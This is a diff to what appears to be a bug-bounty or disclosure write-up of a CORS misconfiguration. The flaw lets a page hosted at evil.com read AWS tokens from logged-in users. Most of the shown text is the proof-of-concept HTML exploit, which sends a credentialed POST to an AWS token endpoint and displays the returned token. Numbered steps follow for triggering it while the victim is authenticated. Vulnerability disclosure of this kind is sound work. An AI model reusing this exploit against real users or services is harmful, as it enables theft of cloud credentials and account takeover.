@@ -22,33 +22,55 @@ AWS tokens from logged-in users.
    `https://evil.com/poc.html`) with the following code:
 
 ```html
+<!DOCTYPE html>
 <html>
 <head>
   <title>CORS PoC</title>
+  <style>
+    body { font-family: monospace; padding: 20px; }
+    button { padding: 8px 16px; margin-bottom: 12px; }
+    pre {
+      white-space: pre-wrap;   /* wrap long lines */
+      word-wrap: break-word;   /* break long words */
+      background: #111;
+      color: #0f0;
+      padding: 10px;
+      border-radius: 5px;
+    }
+  </style>
 </head>
 <body>
-  <button onclick="getToken()">Get AWS Token</button>
+  <button onclick="getToken()">Get Token</button>
   <pre id="output">— no response yet —</pre>
 
   <script>
     function getToken() {
       fetch("https://vs.aws.amazon.com/token", {
         method: "POST",
-        credentials: "include",
-        headers: { "Content-Type": "application/json" },
+        credentials: "include", // include cookies
+        headers: {
+          "Content-Type": "application/json"
+        },
         body: "{}"
       })
-      .then(res => res.json())
+      .then(res => res.json())  // try JSON parse
       .then(data => {
-        document.getElementById("output").innerText = JSON.stringify(data, null, 2);
+        document.getElementById("output").innerText =
+          JSON.stringify(data, null, 2); // formatted
       })
-      .catch(err => {
-        document.getElementById("output").innerText = "Error: " + err;
+      .catch(async err => {
+        try {
+          let text = await err.text();
+          document.getElementById("output").innerText = text;
+        } catch {
+          document.getElementById("output").innerText = "Error: " + err;
+        }
       });
     }
   </script>
 </body>
-</html> 
+</html>
+ 
 ```
 3. Visit the page while authenticated to AWS.
 4. Click the Get AWS Token button.
